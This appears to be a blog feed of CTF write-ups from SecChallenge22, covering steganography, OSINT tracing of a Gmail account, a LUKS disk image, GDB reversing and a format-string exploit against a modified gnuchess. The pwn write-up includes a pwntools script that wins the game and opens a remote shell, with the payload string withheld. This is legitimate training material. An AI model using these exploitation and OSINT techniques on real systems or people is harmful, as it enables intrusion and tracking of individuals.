+    <span class="n">img</span><span class="p">.</span><span class="n">save</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">count</span><span class="si">}</span><span class="s">.png"</span><span class="p">,</span> <span class="s">"PNG"</span><span class="p">)</span>
+    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="n">pr</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">count</span> <span class="o">/</span> <span class="nb">len</span><span class="p">(</span><span class="n">images</span><span class="p">)</span> <span class="o">*</span> <span class="mi">100</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+<span class="n">pr</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Done"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><img src="/media/sc22/misc/piecemaker/puzzle.png" alt="image" /></p>
+
+<p>This had me puzzled (haHa) for a while, but after googling some languages commonly used in CTFs, I found out about <code class="language-plaintext highlighter-rouge">Klingon</code>. Using some <code class="language-plaintext highlighter-rouge">ABCs</code> found online I could decode the following text on the image:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>this is christopher smith known as p
+eacemaker i love formula one aka f1
+as well as f2 and f3 but you know wh
+at would be even better f5 i also lo
+ve java but scripting should be bann
+ed the whole password is in gold
+
+i cherish peace with all my heart
+i dont care how many men women and
+children i need to kill to get it
+</code></pre></div></div>
+
+<p>This next part required a hint from the author, since everyone was stuck on this part for a moment. The hint came:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>We've just received an urgent transmission from Peacemaker telling us his favorite dinosaur is stegosaurus.
+</code></pre></div></div>
+<p>Alright, a stego challenge, nothing I haven’t knew before. But this finally led me to google for <code class="language-plaintext highlighter-rouge">stego f5 java</code> insead of <code class="language-plaintext highlighter-rouge">f5 java</code>. And trust me, it made all the diference (Why would you name a firewall company after a stego tool or vice versa???). I wrote a <code class="language-plaintext highlighter-rouge">bash</code> script to extract whatever is hidden inside the images (just so you see other things on this blog besides python scripts):</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nb">declare</span> <span class="nt">-i</span> <span class="nv">c</span><span class="o">=</span>0
+
+<span class="nb">mkdir</span> <span class="nt">-p</span> out/
+
+<span class="k">for </span>f <span class="k">in </span>piecemaker/<span class="k">*</span>.jpg
+<span class="k">do
+	</span>java <span class="nt">-jar</span> f5.jar x <span class="nt">-e</span> out/<span class="nv">$c</span>.gz <span class="nv">$f</span> <span class="nt">-p</span> <span class="s2">"i cherish peace with all my heart i dont care how many men women and children i need to kill to get it"</span><span class="p">;</span>
+	c+<span class="o">=</span>1	
+<span class="k">done
+
+</span><span class="nb">cd </span>out/
+<span class="nb">rm </span>91.gz 92.gz 93.gz 94.gz 95.gz 96.gz 97.gz 98.gz 99.gz 100.gz 101.gz 102.gz
+<span class="nb">rm </span>103.gz 104.gz 105.gz 106.gz 107.gz 108.gz 109.gz 110.gz 111.gz
+
+<span class="k">for </span>file <span class="k">in</span> <span class="k">*</span>.gz
+<span class="k">do
+	</span><span class="nb">tar </span>zxvf <span class="nv">$file</span>
+<span class="k">done</span>
+</code></pre></div></div>
+
+<h3 id="0x2-joyride-to-the-flag">0x2 joyride to the flag</h3>
+
+<p>At this point, I know, I had the flag… there was only a small problem, again, it was in pieces. Luckily the creator didn’t make any more matryoshkas, or else I would have been sitting here for quite some time.
+Piece by piece, I put together the puzzle, which contained the flag as an image:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>]]></content><author><name>m4rcix</name></author><category term="misc" /><category term="secchallenge22" /><summary type="html"><![CDATA[Thank god there were only two]]></summary></entry><entry><title type="html">Dangerous Volcano</title><link href="https://m4rcix.github.io/sc22/misc/dangerous_volcano" rel="alternate" type="text/html" title="Dangerous Volcano" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/sc22/misc/volcano</id><content type="html" xml:base="https://m4rcix.github.io/sc22/misc/dangerous_volcano"><![CDATA[<h2 id="description">Description</h2>
+
+<p>Hi there Bob,</p>
+
+<p>There is this rival IT Security company called <code class="language-plaintext highlighter-rouge">securityZilla</code>, that is undermining our contracts with some dirty tactics and we don’t want to go out of business because of them.</p>
+
+<p>I’m taking you off the <code class="language-plaintext highlighter-rouge">Fancy Mamba</code> case, and from now on your task is to find out something compromising about this firm. Their public website is <a href="https://securityzilla.secchallenge.crysys.hu">https://securityzilla.secchallenge.crysys.hu</a>.</p>
+
+<p>The codename of the project is <code class="language-plaintext highlighter-rouge">Dangerous Volcano</code>.</p>
+
+<p>Report to me when you find something,</p>
+
+<p>Dan</p>
+
+<p><em>Note: This is not a web challenge!
+Also, any connection with last year’s <code class="language-plaintext highlighter-rouge">Lost &amp; Found</code> challenge or with any twitter, github or flickr user profiles, is purely coincidental.</em></p>
+
+<ul>
+  <li>Author: veloxer</li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<p>Just from the description, it is clear, we are looking at an OSINT challenge.
+Scanning through the site, we can see an email address connected to Janos Nagy: <code class="language-plaintext highlighter-rouge">themrbigjack@gmail.com</code>.</p>
+
+<p>Without thinking I added this to my address book, a habbit I picked up after miserably failing last years OSINT challenge. Since this did nothing I started thinking and realized, I have seen something like this before. There is/was a challenge on HTB, which used the same technique, Google ID.</p>
+
+<p>Scraping the ID from the hangouts website, we can use it to look for entries of the user on the google map for example, and luckily for us, we found this:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">oid=</span><span class="s">"101442286581498986047"</span> <span class="na">email=</span><span class="s">"themrbigjack@gmail.com"</span> <span class="na">data-element-width=</span><span class="s">"399"</span> <span class="na">data-show-on-right=</span><span class="s">"true"</span> <span class="na">style=</span><span class="s">"position: absolute; left: 81px; top: 679.5px; width: 399px;"</span> <span class="na">data-hovercard-id=</span><span class="s">"themrbigjack@gmail.com"</span> <span class="na">data-hovercard-align=</span><span class="s">"h"</span> <span class="na">data-hovercard-owner-id=</span><span class="s">"6"</span><span class="nt">&gt;&lt;/div&gt;</span>
+</code></pre></div></div>
+
+<p>Using the <code class="language-plaintext highlighter-rouge">oid</code> from the previous html element, we can search the google map, and find <a href="https://www.google.com/maps/contrib/101442286581498986047">this</a>.</p>
+
+<p><img src="/media/sc22/misc/volcano/laptop.jpg" alt="image" /></p>
+
+<p>Looking at the image, we can see, its using a software called AnkiWeb.
+Its a kind of learning-card app, where you can share your Deck online with others. And by the looks of it, Mr. Big Jack just shared his top secret learning deck with us. Downloading the app, and getting the shared deck, which is visible on the image, we can flip through the deck, and the flag is ours:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>]]></content><author><name>m4rcix</name></author><category term="misc" /><category term="secchallenge22" /><summary type="html"><![CDATA[All those times spent on HTB finally came in clutch]]></summary></entry><entry><title type="html">che%s%s</title><link href="https://m4rcix.github.io/sc22/pwn/chess" rel="alternate" type="text/html" title="che%s%s" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/sc22/pwn/chess</id><content type="html" xml:base="https://m4rcix.github.io/sc22/pwn/chess"><![CDATA[<h2 id="description">Description</h2>
+
+<p>Ohh no! Someone just broke into our system!</p>
+
+<p>Ok, now they are stealing the source code of our unbeatable che%s%s engine. Aaaand we are locked out of our che%s%s service…</p>
+
+<p>We managed to capture their modified source code while the bad folks uploaded a new version of our software.</p>
+
+<p>Could you help us get inside again?</p>
+
+<p><code class="language-plaintext highlighter-rouge">nc chess.secchallenge.crysys.hu 5017</code></p>
+
+<ul>
+  <li>Author: tcs</li>
+  <li>Attachments: <a href="/media/sc22/pwn/chess/chess">chess</a>, <a href="/media/sc22/pwn/chess/chess-src.tar.gz">chess-src.tar.gz</a></li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<h3 id="0x1-basic-information">0x1 basic information</h3>
+
+<p>Just based on the title of the challenge, one can assume, that we are looking at a format string vulnerability.</p>
+
+<p>Since we are given the source code of the challenge, we can quickly identify, that it is a modified version of <code class="language-plaintext highlighter-rouge">gnuchess-6.2.9</code>. Pulling the original source, and diffing it to the “leaked” source, we can see, that the following parts were modified:</p>
+
+<p>In <code class="language-plaintext highlighter-rouge">main.cc</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="o">*</span><span class="n">solved</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+
+<span class="p">...</span>
+
+<span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">solved</span> <span class="o">==</span> <span class="mh">0xb055</span><span class="p">){</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>and in <code class="language-plaintext highlighter-rouge">frontend/engine.cc</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">engineinput</span><span class="p">,</span> <span class="s">"1-0 {White mates}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Congrats! Here is your reward:"</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>What we are looking at here, is an arbitrary memory write using <code class="language-plaintext highlighter-rouge">printf</code>.
+In a nutshell, format strings work in the following way:</p>
+
+<p>If you supply format characters in the format string part of the function call, the function will expect, that you have placed the variables on the stack according to the format characters. What if not? You are leaking the stack of your program.</p>
+
+<p>But how can we write data? This is where the <code class="language-plaintext highlighter-rouge">%n</code> format character comes into play. If you look up the manpage of <code class="language-plaintext highlighter-rouge">printf</code> for example, it says:</p>
+
+<blockquote>
+  <p>The  number  of  characters written so far is stored into the integer pointed to by the corresponding argument.  That argument shall be an int *, or variant whose size matches  the  (optionally)  supplied  integer length modifier.  No argument is converted.  (This specifier is not supported by the bionic C library.)   The  behavior is  undefined if the conversion specification includes any flags, a field width, or a precision.</p>
+</blockquote>
+
+<p>And luckily for us, the <code class="language-plaintext highlighter-rouge">solved</code> variable is an <code class="language-plaintext highlighter-rouge">int *</code>, so we have everything in order to exploit the code, and get a shell.</p>
+
+<h3 id="0x2-exploit">0x2 exploit</h3>
+
+<p>Since we are playing a proper chess engine, even when setting the <code class="language-plaintext highlighter-rouge">depth</code> of the engine to <code class="language-plaintext highlighter-rouge">1</code> gives us a tough opponent. So obviously we just get another, preferably better, engine to play for us. For this I chose <a href="https://stockfishchess.org/">stockfish</a>, which is a well-known engine, and after a bit of googling I set it up using <a href="https://pypi.org/project/PyChess/">pychess</a>.</p>
+
+<p>Implementing basic I/O communication as usual, and we have a stable way of getting to the part, where we can exploit the format string.</p>
+
+<p>The creators of the challenge were kind enough to put the <code class="language-plaintext highlighter-rouge">solved</code> variable onto the stack. We only had to figure out, where exactly it is.
+This is the part where <code class="language-plaintext highlighter-rouge">GDB</code> came in handy. Breaking at the <code class="language-plaintext highlighter-rouge">printf</code> call, we can examine the stack. 
+Looking at the trace, we can see that we are one function call deep from main, namely inside <code class="language-plaintext highlighter-rouge">NextEngineCmd()</code>.  Disassemblying it, we can see, that it actually allocates quite a huge stackframe:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x000055555556a8d1 &lt;+4&gt;:    push   rbp
+   0x000055555556a8d2 &lt;+5&gt;:    mov    rbp,rsp
+   0x000055555556a8d5 &lt;+8&gt;:    sub    rsp,0x1000
+</code></pre></div></div>
+<p>This means, that the solved variable will be quite far from us. To find its exact location we can break at the line in <code class="language-plaintext highlighter-rouge">main</code> where the variable gets compared:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x000055555555984d &lt;+2780&gt;:    mov    rax,QWORD PTR [rbp-0x1d8]
+   0x0000555555559854 &lt;+2787&gt;:    mov    eax,DWORD PTR [rax]
+   0x0000555555559856 &lt;+2789&gt;:    cmp    eax,0xb055
+   0x000055555555985b &lt;+2794&gt;:    jne    0x555555559873 &lt;main+2818&gt;
+   0x000055555555985d &lt;+2796&gt;:    lea    rdi,[rip+0x4395d]        # 0x55555559d1c1
+   0x0000555555559864 &lt;+2803&gt;:    call   0x555555558810 &lt;system@plt&gt;
+</code></pre></div></div>
+<p>From here, we can use the <code class="language-plaintext highlighter-rouge">x/Ngx $rsp</code> syntax, where <code class="language-plaintext highlighter-rouge">N</code> is a positive integer in order to find the pointer of <code class="language-plaintext highlighter-rouge">solved</code>. (You are looking for a heap address on the stack).</p>
+
+<p>If you found the <code class="language-plaintext highlighter-rouge">N</code>, you know where your your variable is, which you have to overwrite. Since it will be quite far, and your format string is limited to ~50 characters, you will have to use another trick, to directly access any “argument” of the stack (Look into the <code class="language-plaintext highlighter-rouge">%N$p</code> syntax). Since the call to <code class="language-plaintext highlighter-rouge">printf</code> will also allocate some memory on the stack, you will have to find the exact position using the format string vuln, and dumping the memory around the offset using the aforementioned syntax, until you find the exact position.</p>
+
+<p>The script I wrote to solve this challenge automates everything except finding the offset, but to not give the students an instant solution I will remove the winning format string from my code.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">chess</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">chess.engine</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">signal</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="c1"># exit gracefully on Ctrl + C
+</span><span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+	<span class="n">engine</span><span class="p">.</span><span class="n">quit</span><span class="p">()</span>
+	<span class="nb">exit</span><span class="p">()</span>
+
+<span class="c1"># register signal handler
+</span><span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>
+
+<span class="n">pr</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"White winning"</span><span class="p">)</span>
+
+<span class="c1"># set up board and stockfish
+</span><span class="n">engine</span> <span class="o">=</span> <span class="n">chess</span><span class="p">.</span><span class="n">engine</span><span class="p">.</span><span class="n">SimpleEngine</span><span class="p">.</span><span class="n">popen_uci</span><span class="p">(</span><span class="s">"/usr/games/stockfish"</span><span class="p">)</span>
+<span class="n">limit</span> <span class="o">=</span> <span class="n">chess</span><span class="p">.</span><span class="n">engine</span><span class="p">.</span><span class="n">Limit</span><span class="p">(</span><span class="n">depth</span><span class="o">=</span><span class="mi">14</span><span class="p">)</span>
+<span class="n">board</span> <span class="o">=</span> <span class="n">chess</span><span class="p">.</span><span class="n">Board</span><span class="p">()</span>
+
+<span class="c1">#with process(["gdb", "./chess"]) as p:
+</span>	<span class="c1">#p.sendline(b'b *NextEngineCmd+931')
+</span>	<span class="c1">#p.sendline(b'r')
+</span><span class="k">with</span> <span class="n">remote</span><span class="p">(</span><span class="s">"chess.secchallenge.crysys.hu"</span><span class="p">,</span> <span class="mi">5017</span><span class="p">)</span> <span class="k">as</span> <span class="n">p</span><span class="p">:</span>
+	<span class="c1"># initial setup, nerfing the chall
+</span>	<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'White (1) : '</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
+	<span class="n">success</span><span class="p">(</span><span class="s">"Nerfed challenge to oblivion"</span><span class="p">)</span>
+	<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"depth 1"</span><span class="p">)</span>
+	<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'White (1) : '</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
+	<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">WIN</span><span class="p">)</span>
+	<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'White (1) : '</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
+
+	<span class="n">movecount</span> <span class="o">=</span> <span class="mi">1</span>
+
+	<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+
+		<span class="c1"># get the next engine move
+</span>		<span class="n">engine_ret</span> <span class="o">=</span> <span class="n">engine</span><span class="p">.</span><span class="n">play</span><span class="p">(</span><span class="n">board</span><span class="p">,</span> <span class="n">limit</span><span class="p">,</span> <span class="n">info</span><span class="o">=</span><span class="n">chess</span><span class="p">.</span><span class="n">engine</span><span class="p">.</span><span class="n">Info</span><span class="p">.</span><span class="n">SCORE</span><span class="p">)</span>
+		<span class="n">pr</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">engine_ret</span><span class="p">.</span><span class="n">info</span><span class="p">[</span><span class="s">'score'</span><span class="p">].</span><span class="n">white</span><span class="p">()))</span>
+
+		<span class="c1"># send engine move to the challenge
+</span>		<span class="n">san_move</span> <span class="o">=</span> <span class="n">board</span><span class="p">.</span><span class="n">san</span><span class="p">(</span><span class="n">engine_ret</span><span class="p">.</span><span class="n">move</span><span class="p">)</span>
+
+		<span class="c1"># if we checkmate, go interactive
+</span>		<span class="k">if</span> <span class="s">"#"</span> <span class="ow">in</span> <span class="n">san_move</span><span class="p">:</span>
+			<span class="c1">#print(f"Winning move: {san_move}")
+</span>			<span class="c1">#p.interactive()
+</span>			<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">san_move</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+			<span class="n">pr</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"White checkmates"</span><span class="p">)</span>
+			<span class="n">rec</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'White (</span><span class="si">{</span><span class="n">movecount</span><span class="si">}</span><span class="s">) : '</span>
+			<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">rec</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">()</span>
+			<span class="n">success</span><span class="p">(</span><span class="s">"Enjoy your shell"</span><span class="p">)</span>
+			<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+		<span class="c1"># if not checkmate, let it play it out
+</span>		<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">san_move</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+
+		<span class="c1"># update local board
+</span>		<span class="n">board</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">engine_ret</span><span class="p">.</span><span class="n">move</span><span class="p">)</span>
+
+		<span class="n">movecount</span> <span class="o">+=</span> <span class="mi">1</span>
+
+		<span class="c1"># wait for the next prompt
+</span>		<span class="n">rec</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'White (</span><span class="si">{</span><span class="n">movecount</span><span class="si">}</span><span class="s">) : '</span>
+		<span class="n">answer</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">rec</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">()</span>
+		<span class="n">parsed_move</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'My move is : .*\n'</span><span class="p">,</span> <span class="n">answer</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+		<span class="c1"># push the move received to the board
+</span>		<span class="n">board</span><span class="p">.</span><span class="n">push_san</span><span class="p">(</span><span class="n">parsed_move</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The acquired flag is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>]]></content><author><name>m4rcix</name></author><category term="pwn" /><category term="secchallenge22" /><summary type="html"><![CDATA[Who doesn\'t love a good game a chess?]]></summary></entry><entry><title type="html">falleen system</title><link href="https://m4rcix.github.io/sc22/reverse/falleen_system" rel="alternate" type="text/html" title="falleen system" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/sc22/reverse/falleen</id><content type="html" xml:base="https://m4rcix.github.io/sc22/reverse/falleen_system"><![CDATA[<h2 id="description">Description</h2>
+
+<p>We’ve managed to save magnetic tape from the bombarded remains of our capital. Our last hope in the fight against the dark side. But it is encrypted and even our sharpest engineers were unable to crack the code.</p>
+
+<p>Could you acquire the flag and save our humble species with it?</p>
+
+<ul>
+  <li>Author: tcs</li>
+  <li>Attachment: <a href="/media/sc22/reverse/falleen/magnetic-tape.dd">magnetic-tape.dd</a></li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<p>First things first, what file are we looking at. Running <code class="language-plaintext highlighter-rouge">file</code> on it, gives us the following answer:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>magnetic-tape.dd: DOS/MBR boot sector; partition 1 : ID=0xee, start-CHS (0x0,0,2), end-CHS (0x3ff,255,63), startsector 1, 40959 sectors, extended partition table (last)
+</code></pre></div></div>
+
+<p>Ok, so we are looking at some sort of disk image. Running <code class="language-plaintext highlighter-rouge">binwalk</code> on it we can see, that there is a LUKS image inside, which we can extract using <code class="language-plaintext highlighter-rouge">dd</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dd </span><span class="k">if</span><span class="o">=</span>magnetic-tape.dd <span class="nv">of</span><span class="o">=</span>luks.part <span class="nv">skip</span><span class="o">=</span>2048 <span class="nv">count</span><span class="o">=</span>38878
+</code></pre></div></div>
+<p>LUKS is a way of encrypting disks on Linux, so we are going to need a key if we want to progress further. Luckily for us, we hit the jackpot on the first try. Running <code class="language-plaintext highlighter-rouge">strings</code> on the original file gives us tons of gibberish (as usual) and this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The key is:down with the separatists
+</code></pre></div></div>
+
+<p>Using <code class="language-plaintext highlighter-rouge">cryptsetup</code>, we can open the partition:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cryptsetup open <span class="nt">--type</span> luks luks.part luks.opened
+</code></pre></div></div>
+
+<p>Mounting the opened partition, aaaaaaaaaand, nothing. I was puzzled for a minute. But luckily we hit the jackpot twice in a row. Where could they hide the flag if not in a file? Of cource it will be in the opened partition.
+Running <code class="language-plaintext highlighter-rouge">strings</code> on it yields us the flag.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>]]></content><author><name>m4rcix</name></author><category term="reverse" /><category term="secchallenge22" /><summary type="html"><![CDATA[Pretty easy despite the low solve rate]]></summary></entry><entry><title type="html">Layers</title><link href="https://m4rcix.github.io/sc22/reverse/layers" rel="alternate" type="text/html" title="Layers" /><published>2022-03-16T00:00:00+00:00</published><updated>2022-03-16T00:00:00+00:00</updated><id>https://m4rcix.github.io/sc22/reverse/layers</id><content type="html" xml:base="https://m4rcix.github.io/sc22/reverse/layers"><![CDATA[<h2 id="description">Description</h2>
+
+<p>What is an ogre’s favourite network arrangement? … onion routing</p>
+
+<ul>
+  <li>Author: Sun G</li>
+  <li>Attachment: <a href="/media/sc22/reverse/layers/layers">layers</a></li>
+</ul>
+
+<h2 id="solution">Solution</h2>
+
+<h3 id="0x1-basic-information">0x1 basic information</h3>
+
+<p>Starting the binary, the goal seems simple: enter the correct answers, and something will happen, hopefully we get the flag. Digging deeper using <code class="language-plaintext highlighter-rouge">GDB</code>, we see, that the challenge uses <code class="language-plaintext highlighter-rouge">strcmp</code> in order to check, if the answer we provided is correct. I have looked at the source code using <code class="language-plaintext highlighter-rouge">Ghidra</code> as well, but seemed like the strings are somewhat obfuscated, so I tried going another way, which turned out to be a great idea.</p>
+
+<h3 id="0x2-solution">0x2 solution</h3>
+
+<p>Since we are running this program on our own machine, noone is stopping us from modifying the containts of the registers. This lets us save a ton of work. Let the program deobfuscate the correct answer for itself, then right before the call to <code class="language-plaintext highlighter-rouge">strcmp</code> we can just steal it.</p>
+
+<p>The challenge name suggests, that we are going to have to do this a couple of times, so I went ahead and automated it using <code class="language-plaintext highlighter-rouge">gdb scripts</code>. To not present you a one-click solution, the <code class="language-plaintext highlighter-rouge">gdb script</code> is removed from this writeup, however with the above described method, one should be able to replicate my solution.</p>
+
+<p>The acquired flag is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd22{HIDDEN}
+</code></pre></div></div>
+
+<p><a href="/sc22">← Back to SecChallenge22</a></p>]]></content><author><name>m4rcix</name></author><category term="reverse" /><category term="secchallenge22" /><summary type="html"><![CDATA[Glitch in the matrix.. a solvable Sun G challenge?]]></summary></entry></feed>
